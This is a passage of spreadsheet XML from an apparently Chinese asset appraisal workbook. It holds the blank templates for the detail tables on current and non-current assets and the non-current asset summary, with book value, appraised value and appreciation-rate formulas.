    <col width="17.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="13.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="12.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.8333333333333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一年内到期的非流动资产评估明细表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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表3-12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项目及内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="380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6.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="3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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="115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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="115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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="115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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="115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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="115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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="115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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="115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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="115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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="115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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="115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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="115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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="115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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="115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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="115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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="115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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="115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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="115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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="115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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="115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Height="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415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115" t="n"/>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>SUM(G6:G27)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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7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 codeName="Sheet39">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="9.66666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="13.1666666666667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其他流动资产评估明细表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8" t="inlineStr">
        <is>
          <t>表3-13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项目及内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>成本</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="381" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="555">
        <f>ROUND(SUM(F6:F27),2)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>ROUND(SUM(G6:G27),2)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>ROUND(SUM(H6:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B2:K2"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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 codeName="Sheet40">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="90" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.33333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="5.33333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="28" customWidth="1" style="410" min="4" max="4"/>
    <col width="19.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="21.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="20.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="14.5" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>非流动资产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="12.75" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
    </row>
    <row r="3" ht="13.5" customHeight="1" s="415">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表4</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="291">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="290">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="284" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="344" t="n"/>
      <c r="J5" s="292" t="n"/>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>4-1</t>
        </is>
      </c>
      <c r="C6" s="397" t="inlineStr">
        <is>
          <t>债权投资</t>
        </is>
      </c>
      <c r="D6" s="297" t="inlineStr">
        <is>
          <t>债权投资</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'4-1债权投资'!I28</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'4-1债权投资'!J28</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="322" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>4-2</t>
        </is>
      </c>
      <c r="C7" s="397" t="inlineStr">
        <is>
          <t>其他债权</t>
        </is>
      </c>
      <c r="D7" s="297" t="inlineStr">
        <is>
          <t>其他债权投资</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'4-2其他债权投资'!I28</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'4-2其他债权投资'!J28</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="322" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>4-3</t>
        </is>
      </c>
      <c r="C8" s="397" t="inlineStr">
        <is>
          <t>长期应收</t>
        </is>
      </c>
      <c r="D8" s="295" t="inlineStr">
        <is>
          <t>长期应收款</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'4-3长期应收'!F28</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-3长期应收'!G28</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="322" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="B9" s="284" t="inlineStr">
        <is>
          <t>4-4</t>
        </is>
      </c>
      <c r="C9" s="397" t="inlineStr">
        <is>
          <t>长期股权</t>
        </is>
      </c>
      <c r="D9" s="295" t="inlineStr">
        <is>
          <t>长期股权投资</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'4-4股权投资'!H29</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'4-4股权投资'!I29</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="322" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="B10" s="284" t="inlineStr">
        <is>
          <t>4-5</t>
        </is>
      </c>
      <c r="C10" s="397" t="inlineStr">
        <is>
          <t>其他权投</t>
        </is>
      </c>
      <c r="D10" s="297" t="inlineStr">
        <is>
          <t>其他权益工具投资</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>'4-5其他权益工具投资'!G29</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>'4-5其他权益工具投资'!H29</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="555">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="322" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="B11" s="284" t="inlineStr">
        <is>
          <t>4-6</t>
        </is>
      </c>
      <c r="C11" s="397" t="inlineStr">
        <is>
          <t>其他非金</t>
        </is>
      </c>
      <c r="D11" s="297" t="inlineStr">
        <is>
          <t>其他非流动金融资产</t>
        </is>
      </c>
      <c r="E11" s="555">
        <f>'4-6其他非流动金融资产汇总'!E24</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>'4-6其他非流动金融资产汇总'!F24</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="555">
